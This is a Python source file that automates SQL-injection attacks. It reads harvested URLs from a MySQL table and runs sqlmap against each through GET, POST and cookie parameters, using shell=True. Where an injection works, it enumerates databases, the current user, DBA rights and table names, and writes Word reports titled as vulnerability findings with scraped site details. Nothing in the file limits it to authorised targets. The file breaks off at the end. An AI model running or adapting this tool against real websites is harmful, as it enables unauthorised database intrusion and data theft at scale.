# -*- coding:utf-8 -*-
#__author__:langzi
#__blog__:www.langzi.fun
import re
import subprocess
import time
import os
from docx import Document
from docx.shared import Pt
from docx.shared import RGBColor
from docx.oxml.ns import qn
import requests
requests.packages.urllib3.disable_warnings()
from bs4 import BeautifulSoup
from urllib.parse import urlparse,urljoin
import random
from concurrent.futures import ProcessPoolExecutor
import pymysql
import contextlib
import configparser
import multiprocessing

cfg = configparser.ConfigParser()
cfg.read('Config.ini')
user = cfg.get("Server", "username")
passwd = cfg.get("Server", "password")
host = cfg.get("Server", "host")
Dbname = cfg.get("Server", "db")
port = int(cfg.get("Server", "port"))
thread_s = int(cfg.get("Config", "thread_s"))


@contextlib.contextmanager
def connect_mysql():
    coon = pymysql.connect(user=user, passwd=passwd, host=host, db=Dbname, port=port, charset='utf8')
    cursor = coon.cursor()

    try:
        yield cursor
    except Exception as e:
        print(e)
        pass
    finally:
        coon.commit()
        cursor.close()
        coon.close()


headerss = [
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/22.0.1207.1 Safari/537.1",
    "Mozilla/5.0 (X11; CrOS i686 2268.111.0) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.57 Safari/536.11",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1092.0 Safari/536.6",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.6 (KHTML, like Gecko) Chrome/20.0.1090.0 Safari/536.6",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/19.77.34.5 Safari/537.1",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.9 Safari/536.5",
    "Mozilla/5.0 (Windows NT 6.0) AppleWebKit/536.5 (KHTML, like Gecko) Chrome/19.0.1084.36 Safari/536.5",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 5.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_8_0) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1063.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1062.0 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.1) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.1 Safari/536.3",
    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/536.3 (KHTML, like Gecko) Chrome/19.0.1061.0 Safari/536.3",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24",
    "Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/535.24 (KHTML, like Gecko) Chrome/19.0.1055.1 Safari/535.24"]

def writedata(x):
    with open('log.txt', 'a+')as aa:
        aa.write('***********************************' + '\n')
        aa.write(str(time.strftime('%Y-%m-%d:%H:%M:%S   ', time.localtime())) + str(x) + '\n')



class Get_Info:
    def __init__(self,url):
        self.url=url
        self.title_parrten = 'class="w61-0"><div class="ball">(.*?)</div></td>'  # group(1) 正常
        self.ip_parrten = '>IP：(.*?)</a></div>'  # group(1) 正常
        self.ages = '" target="_blank">(.*?)</a></div></div>'  # group(1)
        self.whois_id = '备案号：</span><a href=.*?" target="_blank">(.*?)</a></div>'  # 需group(1)
        self.whois_type = '<span>性质：</span><strong>(.*?)</strong></div>'  # 需group(1)
        self.whois_name = '<span>名称：</span><strong>(.*?)</strong></div>'  # 需group(1)
        self.whois_time = '<span>审核时间：</span><strong>(.*?)</strong></div>'  # 需group(1)
        self.include_baidu = '<div class="Ma01LiRow w12-1 ">(.*?)</div>'  # group(1)
        self.infos = '<div class="MaLi03Row w180">(.*?)</div>'  # 要findall 0，1，2，3
        self.result={'百度权重':'',
                    '网站主页':'',
                     '网站描述':'',
                   '网站标题':'',
                   'IP__坐标':'',
                   '所属__IP':'',
                   '网站年龄':'',
                   '备案编号':'',
                   '备案性质':'',
                   '备案名称':'',
                   '备案时间':'',
                   '百度收录':'',
                   '协议类型':'',
                   '页面类型':'',
                   '服务类型':'',
                   '程序语言':''}

    def get_baidu_weight(self):
        time.sleep(random.randint(1, 5))
        x = str(random.randint(1, 9))
        data = {
            't': 'rankall',
            'on': 1,
            'type': 'baidupc',
            'callback': 'jQuery111303146901980779846_154444474116%s' % (x),
            'host': self.url
        }

        headers = {

            'Accept': 'text/javascript, application/javascript, application/ecmascript, application/x-ecmascript, */*; q=0.01',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'zh-CN,zh;q=0.9',
            'Connection': 'keep-alive',
            'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'Cookie': 'UM_distinctid=165af67ee6f352-07238a34ed3941-9393265-1fa400-165af67ee70473; CNZZDATA5082706=cnzz_eid%3D832961605-1544438317-null%26ntime%3D1544443717; Hm_lvt_aecc9715b0f5d5f7f34fba48a3c511d6=1544443985; Hm_lpvt_aecc9715b0f5d5f7f34fba48a3c511d6=1544443985; qHistory=aHR0cDovL3JhbmsuY2hpbmF6LmNvbS9iYWlkdW1vYmlsZS8r55m+5bqm56e75Yqo5p2D6YeNfGh0dHA6Ly9yYW5rLmNoaW5hei5jb20vcmFua2FsbC8r5p2D6YeN57u85ZCI5p+l6K+ifGh0dHA6Ly9yYW5rLmNoaW5hei5jb20r55m+5bqm5p2D6YeN5p+l6K+ifGh0dHA6Ly9pbmRleC5jaGluYXouY29tLyvlhbPplK7or43lhajnvZHmjIfmlbB8aHR0cDovL3JhbmsuY2hpbmF6LmNvbS9yYW5rL2hpc3RvcnkuYXNweCvmnYPph43ljoblj7Lmn6Xor6I=',
            'Host': 'rank.chinaz.com',
            'Origin': 'http://rank.chinaz.com',
            'Referer': 'http://rank.chinaz.com',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36',
            'X-Requested-With': 'XMLHttpRequest'

        }
        try:
            urls = 'http://rank.chinaz.com/ajaxseo.aspx?t=rankall&on=1&type=undefined&callback=jQuery111303146901980779846_154444474116%s' % (
                x)

            r = requests.post(url=urls, headers=headers, data=data,timeout=15)
            try:
                res = re.search(b',"br":(\d),"beforBr', r.content).group(1)
            except:
                pass
            if res:
                return res.decode()
            else:
                return '0'
        except:
            return '获取失败'


    def get_info_from_pattren(self,pattren, result):
        try:
            res = re.search(pattren, result).group(1)
            return res
        # return str(res.encode('utf-8'))
        except:
            return '暂无信息'

    def scan_seo(self):
        UA = random.choice(headerss)
        headers = {'User-Agent': UA}
        domain_url = self.url.replace('https://', '').replace('http://', '').replace('www.', '').split('/')[0]
        urls = 'http://seo.chinaz.com/' + domain_url
        # url,title,weights,ip,ages,whois_id,whois_type,whois_name,whois_time
        # 网址，标题，百度权重，ip信息，年龄，备案号，备案性质，备案名称，备案时间
        # include_baidu,request,text,service,language
        # 百度收录，，协议类型，页面类型，服务器类型，程序语言
        try:
            req = requests.get(urls, headers, verify=False, timeout=20)
            encoding = requests.utils.get_encodings_from_content(req.text)[0]
            r = req.content.decode(encoding, 'replace')
        except Exception as e:
            writedata(str(e))

        try:
            req = requests.get(self.url, headers, verify=False, timeout=20)
            encoding = requests.utils.get_encodings_from_content(req.text)[0]
            rss = req.content.decode(encoding, 'replace')
        except Exception as e:
            writedata(str(e))


        self.result['网站描述'] = '暂无信息'
        try:
            description = re.search('description.*?content=(.*?)>',rss,re.S).group(1)
            self.result['网站描述'] = description.strip()
        except:
            pass

        self.result['百度权重'] = str(self.get_baidu_weight())

        self.result['网站主页'] = self.url.split('//')[0] + '//' + self.url.split('//')[1].split('/')[0]

        try:
            req1 = requests.get(url=self.url, headers=headers, verify=False, timeout=10)
            encoding = requests.utils.get_encodings_from_content(req1.text)[0]
            rress = req1.content.decode(encoding, 'replace')
            title_pattern = '<title>(.*?)</title>'
            title = re.search(title_pattern, rress, re.S | re.I)
            self.result['网站标题'] = str(title.group(1))
        except:
            self.result['网站标题'] = self.url.split('//')[0] + '//' + self.url.split('//')[1].split('/')[0]


        ip_infos = self.get_info_from_pattren(self.ip_parrten, r)
        if '[' in ip_infos:
            ip, address = ip_infos.split('[')[0], ip_infos.split('[')[1]
            self.result['IP__坐标'] = address.replace(']', '')
            self.result['所属__IP'] = ip
        else:
            self.result['IP__坐标'] = '获取失败'
            self.result['所属__IP'] = '获取失败'

        self.result['网站年龄'] = self.get_info_from_pattren(self.ages, r)
        self.result['备案编号'] = self.get_info_from_pattren(self.whois_id, r)
        self.result['备案性质'] = self.get_info_from_pattren(self.whois_type, r)
        self.result['备案名称'] = self.get_info_from_pattren(self.whois_name, r)
        self.result['备案时间'] = self.get_info_from_pattren(self.whois_time, r)
        self.result['百度收录'] = self.get_info_from_pattren(self.include_baidu, r)

        dd = re.findall(self.infos, r, re.S)
        resu = ['暂无信息' if x.replace(' ', '') is '' else x for x in dd]
        try:
            self.result['协议类型'] = resu[0]
        except:
            self.result['协议类型'] = '获取失败'

        try:
            self.result['页面类型'] = resu[1]
        except:
            self.result['页面类型'] = '获取失败'

        try:
            self.result['服务类型'] = resu[2]
        except:
            self.result['服务类型'] = '获取失败'

        try:
            self.result['程序语言'] = resu[3]
        except:
            self.result['程序语言'] = '获取失败'
        return self.result



def Check_Inj_Result(content):
    # 检查是否存在注入，如果存在则返回内容，不存在返回None
    if 'use only' in content and '---' in content:
        return 'ACCESS'
    if '---' in content:
        return 'MYSQL'


def Run_Sqlmap(common):
    '''
    :param common: 传入的命令，比如
        python sqlmap.py -u xxxxx
    :return: sqlmap运行结果
    '''
    try:
       # print('Scan : '+common.split(' ')[3])
        print('Scan : '+common.replace('--random-agent --dbs  --current-user --current-db --is-db --batch','').replace('sqlmap\\',''))
    except:
        pass
    try:
        res = subprocess.Popen(common, shell=True, stdout=subprocess.PIPE)
        result = res.stdout.read().decode()
        # print(result)
        #writedata(common)
        #writedata(result)
    except Exception as e:
        writedata('[WARNING ERROR]' + str(e))
        pass
    finally:
        return result





def Common_Database(document,common,content,url,sqlurl):
    # if Check_Inj_Result(content):
    #     print('存在注入，开始获取通用数据')
    # 这里的判断可以在调用函数中做判断，方便后期维护
    document.add_paragraph('基本信息', 'Title')
    document.add_paragraph('漏洞类型：SQL注入漏洞', 'Subtitle')
    document.add_paragraph('漏洞等级：高危', 'Subtitle')
    document.add_paragraph('厂商信息：此处需要手动搜索', 'Subtitle')

    document.add_page_break()

    document.add_paragraph('漏洞简述', 'Title')
    document.add_paragraph('漏洞描述', 'Subtitle')
    document.add_paragraph('即当应用程序使用输入内容来构造动态SQL语句以访问数据库时，如果对输入的参数没有进行严格的过滤或者过滤不完整将会导致SQL注入攻击的产生。', 'DaHei')
    document.add_paragraph('漏洞危害', 'Subtitle')
    document.add_paragraph(
        '恶意用户通过构造特殊的SQL查询语句把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗服务器执行恶意的SQL命令。从而可以获取到数据库的相关信息，包括数据库账号密码信息，甚至可上传木马，从而控制服务器。',
        'DaHei')

    document.add_page_break()

    document.add_paragraph('漏洞详情', 'Title')
    document.add_paragraph('网站漏洞报表', 'Subtitle')

    try:
        result_info = re.search('---(.*?)---.*?\[INFO\] (the back-end DBMS is .*?)\[', content, re.S)
        inj = result_info.group(1)
        dbs = result_info.group(2)
        document.add_paragraph('注入网址:'+sqlurl,'ZhongHei')
        document.add_paragraph('执行命令:'+common,'ZhongHei')
        # print(inj.replace('Parameter: ', '注入参数(方式) : ').replace('Type: ', '注入方式 : ').replace('Title: ',
        #                                                                                      '注入标题 : ').replace(
        #     'Payload: ', '注入攻击 : ') + '\n')
        document.add_paragraph(inj.replace('Parameter: ', '注入参数(方式) : ').replace('Type: ', '注入方式 : ').replace('Title: ',
                                                                                             '注入标题 : ').replace(
            'Payload: ', '注入攻击 : '),'ZhongHei')
        # print(dbs.replace('the back-end DBMS is ', '数据库类型 : ').replace('web server operating system: ',
        #                                                                '服务器版本 : ').replace(
        #     'web application technology: ', '服务器语言 : ').replace('back-end DBMS: ', '数据库版本 : ') + '\n')
        document.add_paragraph(dbs.replace('the back-end DBMS is ', '数据库类型 : ').replace('web server operating system: ',
                                                                       '服务器版本 : ').replace(
            'web application technology: ', '服务器语言 : ').replace('back-end DBMS: ', '数据库版本 : '),'ZhongHei')

        document.add_page_break()

        try:
            document.add_paragraph('网站信息报表', 'Subtitle')
            info = Get_Info(url)
            infos = info.scan_seo()
            for k,v in infos.items():
                document.add_paragraph(k+'  '+v,'ZhongHei')
            document.add_page_break()
        except Exception as e:
            writedata(str(e))
        document.add_paragraph('网站漏洞复现', 'Subtitle')
        document.add_paragraph('执行命令','DaHei')
        document.add_paragraph(common,'ZhongHOng')
        document.add_paragraph('返回结果','DaHei')
        document.add_paragraph(content,'XiaoLv')
        document.add_paragraph('敏感数据','DaHei')
        document.add_paragraph(inj.replace('Parameter: ', '注入参数(方式) : ').replace('Type: ', '注入方式 : ').replace('Title: ',
                                                                                             '注入标题 : ').replace(
            'Payload: ', '注入攻击 : '),'ZhongHOng')
        document.add_paragraph(dbs.replace('the back-end DBMS is ', '数据库类型 : ').replace('web server operating system: ',
                                                                       '服务器版本 : ').replace(
            'web application technology: ', '服务器语言 : ').replace('back-end DBMS: ', '数据库版本 : '),'ZhongHOng')


    except Exception as e:
        writedata(str(e))

def Get_Column(document,common,content):
    try:
        all_column_grep = re.search('(Database: .*?\[.*?)\[\d',content,re.S)
        all_column = all_column_grep.group(1)
        document.add_paragraph('执行命令', 'DaHei')
        document.add_paragraph(common,'ZhongHOng')
        document.add_paragraph('返回结果', 'DaHei')
        document.add_paragraph(content, 'XiaoLv')
        document.add_paragraph('敏感数据', 'DaHei')
        document.add_paragraph('当前数据库下存在如下表',  'ZhongHOng')
        document.add_paragraph(all_column, 'ZhongHOng')
        document.add_paragraph('复现完成，验证存在SQL注入漏洞','DaHei')
        document.add_page_break()

    except Exception as e:
        writedata(str(e))

def Mysql_Database(document,content):
    try:
    # 获取当前用户，当前数据库，是否为dba权限
        current_user_grep = re.search('(current user:.*?)\[', content, re.S)
        current_user = current_user_grep.group(1).replace('current user', '当前用户')
        document.add_paragraph(current_user.strip(), 'ZhongHOng')
        # print(current_user)
    except Exception as e:
        writedata(str(e))

    try:
        current_db_grep = re.search('(current database:.*?)\[', content, re.S)
        current_db = current_db_grep.group(1).replace('current database', '当前数据库')
        document.add_paragraph(current_db.strip(), 'ZhongHOng')

        # print(current_db)
    except Exception as e:
        writedata(str(e))

    try:
        is_dba_grep = re.search('(current user is DBA:.*?)\[', content, re.S)
        is_dba = is_dba_grep.group(1).replace('current user is DBA', '是否有DBA权限')
        # print(is_dba)
        document.add_paragraph(is_dba.strip(), 'ZhongHOng')

    except Exception as e:
        writedata(str(e))

    try:
        # 获取所有的数据库
        all_dbs_grep = re.search('available databases.*?:(.*?)\[\d', content, re.S)
        all_dbs = all_dbs_grep.group(1)
        # print('所有数据库:{}'.format(all_dbs))
        document.add_paragraph('所有数据库:', 'ZhongHOng')
        document.add_paragraph(all_dbs.strip(), 'ZhongHOng')

    except Exception as e:
        writedata(str(e))
    document.add_page_break()

def Get_Mysql_Current_Data_Name(content):
    try:
    # 如果获取到当前数据库名称，就返回当前数据库名称，不然则返回None
        current_db = re.search('current database:(.*?)\[', content, re.S).group(1)
        current_db = (current_db.strip().replace("'",''))
        # print(current_db)
        if current_db:
            return current_db
        else:
            return None
    except Exception as e:
        writedata(str(e))


def main(url):

    Scan_Status = 0
    url_p = urlparse(url)
    domain = url_p.netloc
    try:
        filename = url.split('//')[1].split('/')[0] + '__页面存在SQL注入漏洞.docx'
    except:
        filename = domain.replace(':','_').replace('/','_') + '__页面存在SQL注入漏洞.docx'
    finally:
        filename = 'result/' + filename
    try:
        domain = url.split('//')[0]+'//'+url.split('//')[1].split('/')[0]
    except:
        pass
    # 这个用作判断是否完整的写入了数据，
    # 如果完整的写入，则就不需要使用后面的post和cookie注入了
    '''
    - 判断注入(如果有)
        优先写入 通用数据

            判断是mysql 还是 access 类
            access ： 调用tables
            mysql ： 写入数据库信息（当前用户，数据库名等待）

            mysql 出现权限问题只能读一张表(判断返回的结果中有数据库名的话)
            mysql：获取该数据库下所有的表名

    :param url:
    :return:
    '''
    common_1 = 'python sqlmap\sqlmap.py -u {} --random-agent --dbs  --current-user --current-db --is-db --batch'.format(url)
    result_1 = Run_Sqlmap(common_1)
    # 这里获取注入的结果 有限判断是否有注入
    if Check_Inj_Result(result_1):
        # 优先写入通用结果
        document = Document(docx=os.path.join(os.getcwd(), 'default.docx'))

        DaHei = document.styles.add_style('DaHei', 1)
        # 设置字体尺寸
        DaHei.font.size = Pt(16)
        # 设置字体颜色
        DaHei.font.color.rgb = RGBColor(0, 0, 0)
        # 黑色
        # UserStyle1.font.color.rgb = RGBColor(0xff, 0xde, 0x00)
        # 居中文本
        DaHei.font.name = '仿宋'
        DaHei._element.rPr.rFonts.set(qn('w:eastAsia'), '仿宋')

        ZhongHei = document.styles.add_style('ZhongHei', 1)
        # 设置字体尺寸
        ZhongHei.font.size = Pt(10)
        # 设置字体颜色
        ZhongHei.font.color.rgb = RGBColor(0, 0, 0)
        # 黑色
        # UserStyle1.font.color.rgb = RGBColor(0xff, 0xde, 0x00)
        # 居中文本
        ZhongHei.font.name = '仿宋'
        ZhongHei._element.rPr.rFonts.set(qn('w:eastAsia'), '仿宋')

        ZhongHOng = document.styles.add_style('ZhongHOng', 1)
        # 设置字体尺寸
        ZhongHOng.font.size = Pt(9)
        # 设置字体颜色
        ZhongHOng.font.color.rgb = RGBColor(178, 34, 34)
        # 红色
        # UserStyle1.font.color.rgb = RGBColor(0xff, 0xde, 0x00)
        # 居中文本
        ZhongHOng.font.name = '仿宋'
        ZhongHOng._element.rPr.rFonts.set(qn('w:eastAsia'), '仿宋')

        XiaoLv = document.styles.add_style('XiaoLv', 1)
        # 设置字体尺寸
        XiaoLv.font.size = Pt(6.5)
        # 设置字体颜色
        XiaoLv.font.color.rgb = RGBColor(0, 255, 0)
        # 绿色
        # UserStyle1.font.color.rgb = RGBColor(0xff, 0xde, 0x00)
        # 居中文本
        XiaoLv.font.name = '仿宋'
        XiaoLv._element.rPr.rFonts.set(qn('w:eastAsia'), '仿宋')
        Common_Database(document,common_1.replace('--batch',''),result_1,domain,url)

    if Check_Inj_Result(result_1) == 'ACCESS':
        # 如果为access类，需要获取表的名
        common_2 = 'python sqlmap\sqlmap.py -u {} --tables --random-agent --batch'.format(url)
        result_2 = Run_Sqlmap(common_2)
        # 尝试写入表名
        Get_Column(document,common_2.replace('--batch',''),result_2)
        Scan_Status = 1
        # access到此为止就ok了

    if Check_Inj_Result(result_1) == 'MYSQL':
        # 如果为mysql类，优先写入mysql类通用数据
        Mysql_Database(document,result_1)
        Scan_Status = 1
        current_db = Get_Mysql_Current_Data_Name(result_1)
        # 获取当前数据库名，尝试获取表明
        if current_db:
            common_3 = 'python sqlmap\sqlmap.py -u {} -D {} --tables --random-agent --batch'.format(url,current_db)
            result_3 = Run_Sqlmap(common_3)
            # 如果真的获取到了表，则写入
            Get_Column(document,common_3.replace('--batch',''),result_3)
            Scan_Status = 1
            # MYSQL到此为止就ok了
    if Scan_Status == 1:
        document.add_paragraph('修复建议', 'Title')
        document.add_paragraph('代码原理防护', 'Subtitle')
        document.add_paragraph('''
        1.对用户的输入进行严格过滤，包括所有的参数，URL和HTTP头部等所有需要传给数据库的数据。
        包括但不限于以下字符及字符串
        select and or like regxp from where update exec order by having drop delete ( ) [ ] < > , . ; : ' " # % + - _ = / * @
        2.预编译SQL语句，而不要动态组装SQL语句，否则必须确保在使用输入的数据组装成SQL语句之前，对特殊字符进行预处理。
        3.以最小权限执行SQL语句
        ''','DaHei')
        document.add_paragraph('安全防火墙防护', 'Subtitle')
        document.add_paragraph('''
        1.安装网站防火墙
        2.接入云WAF
        ''','DaHei')
        try:
            section = document.sections[0]
            header = section.header
            paragraph = header.paragraphs[0]
            paragraph.text = "Report Power By Langzi"
        except:
            pass
        document.save(filename)
        # print('SCAN OVER:'+url)

        return 'SCAN OVER'

def main2(url):
    document = Document(docx=os.path.join(os.getcwd(), 'default.docx'))
    Scan_Status = 0
    url_p = urlparse(url)
    domain = url_p.netloc
    try:
        filename = url.split('//')[1].split('/')[0] + '__页面存在SQL注入漏洞.docx'
    except:
        filename = domain.replace(':','_').replace('/','_') + '__页面存在SQL注入漏洞.docx'
    finally:
        filename = 'result/' + filename
    try:
        domain = url.split('//')[0]+'//'+url.split('//')[1].split('/')[0]
    except:
        pass
    # 到现在位置，简单的注入模型完成，下面则尝试进行cookie和post高等级注入
    urls, datas = url.split('?')[0], url.split('?')[1]
    # 这里截断出url 和 values
    common_4 = 'python sqlmap\sqlmap.py -u {} --data {} --level 2  --random-agent --dbs  --current-user --current-db --is-db --batch'.format(urls,datas)

    result_4 = Run_Sqlmap(common_4)
    if Check_Inj_Result(result_4):
        DaHei = document.styles.add_style('DaHei', 1)
        # 设置字体尺寸
        DaHei.font.size = Pt(16)
        # 设置字体颜色
        DaHei.font.color.rgb = RGBColor(0, 0, 0)
        # 黑色
        # UserStyle1.font.color.rgb = RGBColor(0xff, 0xde, 0x00)
        # 居中文本
        DaHei.font.name = '仿宋'
        DaHei._element.rPr.rFonts.set(qn('w:eastAsia'), '仿宋')

        ZhongHei = document.styles.add_style('ZhongHei', 1)
        # 设置字体尺寸
        ZhongHei.font.size = Pt(10)
        # 设置字体颜色
        ZhongHei.font.color.rgb = RGBColor(0, 0, 0)
        # 黑色
        # UserStyle1.font.color.rgb = RGBColor(0xff, 0xde, 0x00)
        # 居中文本
        ZhongHei.font.name = '仿宋'
        ZhongHei._element.rPr.rFonts.set(qn('w:eastAsia'), '仿宋')

        ZhongHOng = document.styles.add_style('ZhongHOng', 1)
        # 设置字体尺寸
        ZhongHOng.font.size = Pt(9)
        # 设置字体颜色
        ZhongHOng.font.color.rgb = RGBColor(178, 34, 34)
        # 红色
        # UserStyle1.font.color.rgb = RGBColor(0xff, 0xde, 0x00)
        # 居中文本
        ZhongHOng.font.name = '仿宋'
        ZhongHOng._element.rPr.rFonts.set(qn('w:eastAsia'), '仿宋')

        XiaoLv = document.styles.add_style('XiaoLv', 1)
        # 设置字体尺寸
        XiaoLv.font.size = Pt(6.5)
        # 设置字体颜色
        XiaoLv.font.color.rgb = RGBColor(0, 255, 0)
        # 绿色
        # UserStyle1.font.color.rgb = RGBColor(0xff, 0xde, 0x00)
        # 居中文本
        XiaoLv.font.name = '仿宋'
        XiaoLv._element.rPr.rFonts.set(qn('w:eastAsia'), '仿宋')
        Common_Database(document,common_4.replace('--batch',''),result_4,domain,url)

    if Check_Inj_Result(result_4) == 'ACCESS':
        common_5 = 'python sqlmap\sqlmap.py -u {} --data {} --tables --level 2 --random-agent --batch'.format(urls,datas)
        result_5 = Run_Sqlmap(common_5)
        Get_Column(document,common_5.replace('--batch',''),result_5)
        Scan_Status = 1

    if Check_Inj_Result(result_4) == 'MYSQL':
        Mysql_Database(document,result_4)
        Scan_Status = 1
        current_db = Get_Mysql_Current_Data_Name(result_4)
        if current_db:
            common_6 = 'python sqlmap\sqlmap.py -u {} --data {} -D {} --tables --level 2 --tables  --random-agent --batch'.format(urls,datas,current_db)
            result_6 = Run_Sqlmap(common_6)
            Get_Column(document,common_6.replace('--batch',''),result_6)
            Scan_Status = 1
    if Scan_Status == 1:
        document.add_paragraph('修复建议', 'Title')
        document.add_paragraph('代码原理防护', 'Subtitle')
        document.add_paragraph('''
        1.对用户的输入进行严格过滤，包括所有的参数，URL和HTTP头部等所有需要传给数据库的数据。
        包括但不限于以下字符及字符串
        select and or like regxp from where update exec order by having drop delete ( ) [ ] < > , . ; : ' " # % + - _ = / * @
        2.预编译SQL语句，而不要动态组装SQL语句，否则必须确保在使用输入的数据组装成SQL语句之前，对特殊字符进行预处理。
        3.以最小权限执行SQL语句
        ''','DaHei')
        document.add_paragraph('安全防火墙防护', 'Subtitle')
        document.add_paragraph('''
        1.安装网站防火墙
        2.接入云WAF
        ''','DaHei')
        try:
            section = document.sections[0]
            header = section.header
            paragraph = header.paragraphs[0]
            paragraph.text = "Report Power By Langzi"
        except:
            pass
        document.save(filename)
        # print('SCAN OVER:'+url)


        return 'SCAN OVER'


    common_4 = 'python sqlmap\sqlmap.py -u {} --cookie {} --level 2  --random-agent --dbs  --current-user --current-db --is-db --batch'.format(
        urls, datas)

    result_4 = Run_Sqlmap(common_4)
    if Check_Inj_Result(result_4):
        document = Document(docx=os.path.join(os.getcwd(), 'default.docx'))

        DaHei = document.styles.add_style('DaHei', 1)
        # 设置字体尺寸
        DaHei.font.size = Pt(16)
        # 设置字体颜色
        DaHei.font.color.rgb = RGBColor(0, 0, 0)
        # 黑色
        # UserStyle1.font.color.rgb = RGBColor(0xff, 0xde, 0x00)
        # 居中文本
        DaHei.font.name = '仿宋'
        DaHei._element.rPr.rFonts.set(qn('w:eastAsia'), '仿宋')

        ZhongHei = document.styles.add_style('ZhongHei', 1)
        # 设置字体尺寸
        ZhongHei.font.size = Pt(10)
        # 设置字体颜色
        ZhongHei.font.color.rgb = RGBColor(0, 0, 0)
        # 黑色
        # UserStyle1.font.color.rgb = RGBColor(0xff, 0xde, 0x00)
        # 居中文本
        ZhongHei.font.name = '仿宋'
        ZhongHei._element.rPr.rFonts.set(qn('w:eastAsia'), '仿宋')

        ZhongHOng = document.styles.add_style('ZhongHOng', 1)
        # 设置字体尺寸
        ZhongHOng.font.size = Pt(9)
        # 设置字体颜色
        ZhongHOng.font.color.rgb = RGBColor(178, 34, 34)
        # 红色
        # UserStyle1.font.color.rgb = RGBColor(0xff, 0xde, 0x00)
        # 居中文本
        ZhongHOng.font.name = '仿宋'
        ZhongHOng._element.rPr.rFonts.set(qn('w:eastAsia'), '仿宋')

        XiaoLv = document.styles.add_style('XiaoLv', 1)
        # 设置字体尺寸
        XiaoLv.font.size = Pt(6.5)
        # 设置字体颜色
        XiaoLv.font.color.rgb = RGBColor(0, 255, 0)
        # 绿色
        # UserStyle1.font.color.rgb = RGBColor(0xff, 0xde, 0x00)
        # 居中文本
        XiaoLv.font.name = '仿宋'
        XiaoLv._element.rPr.rFonts.set(qn('w:eastAsia'), '仿宋')
        Common_Database(document,common_4.replace('--batch', ''), result_4, domain, url)

    if Check_Inj_Result(result_4) == 'ACCESS':
        common_5 = 'python sqlmap\sqlmap.py -u {} --cookie {} --tables --level 2  --random-agent --batch'.format(urls, datas)
        result_5 = Run_Sqlmap(common_5)
        Get_Column(document,common_5.replace('--batch',''),result_5)
        Scan_Status = 1

    if Check_Inj_Result(result_4) == 'MYSQL':
        Mysql_Database(document,result_4)
        Scan_Status = 1
        current_db = Get_Mysql_Current_Data_Name(result_4)
        if current_db:
            common_6 = 'python sqlmap\sqlmap.py -u {} --cookie {} -D {} --tables --level 2  --random-agent --batch'.format(urls,
                                                                                                                    datas,
                                                                                                                  current_db)
            result_6 = Run_Sqlmap(common_6)
            Get_Column(document,common_6.replace('--batch',''),result_6)
            Scan_Status = 1
    if Scan_Status == 1:
        document.add_paragraph('修复建议', 'Title')
        document.add_paragraph('代码原理防护', 'Subtitle')
        document.add_paragraph('''
        1.对用户的输入进行严格过滤，包括所有的参数，URL和HTTP头部等所有需要传给数据库的数据。
        包括但不限于以下字符及字符串
        select and or like regxp from where update exec order by having drop delete ( ) [ ] < > , . ; : ' " # % + - _ = / * @
        2.预编译SQL语句，而不要动态组装SQL语句，否则必须确保在使用输入的数据组装成SQL语句之前，对特殊字符进行预处理。
        3.以最小权限执行SQL语句
        ''','DaHei')
        document.add_paragraph('安全防火墙防护', 'Subtitle')
        document.add_paragraph('''
        1.安装网站防火墙
        2.接入云WAF
        ''','DaHei')
        try:
            section = document.sections[0]
            header = section.header
            paragraph = header.paragraphs[0]
            paragraph.text = "Report Power By Langzi"
        except:
            pass
        document.save(filename)
        # print('SCAN OVER:'+url)

        return 'SCAN OVER'



def scan(sem):
    time.sleep(random.randint(1,15))
    while 1:
        sem.acquire()
        with connect_mysql() as conn:
            sql1 = 'select links from sec_get_links where sql_get=0 limit 1'
            sql2 = 'update sec_get_links set sql_get=1 where sql_get=0 limit 1'
            conn.execute(sql1)
            res = conn.fetchone()
            if res == None:
                sem.release()
                return
            else:
                Url_Links = eval(res[0])
            conn.execute(sql2)
            sem.release()
        html_links = Url_Links.get('html_links')
        id_links = Url_Links.get('id_links')
        if html_links:
            for html_link in html_links:
                dix = main(html_link)
                if dix == 'SCAN OVER':
                    break
        if id_links:
            for id_link in id_links:
                dix = main(id_link.replace('&','^&'))
                if dix == 'SCAN OVER':
                    break
                dix2 = main2(id_link.replace('&','^&'))
                if dix2 == 'SCAN OVER':
                    break




if __name__ == '__main__':
    multiprocessing.freeze_support()

    sem = multiprocessing.Manager().BoundedSemaphore(1)

    if os.path.exists('result'):
        pass
    else:
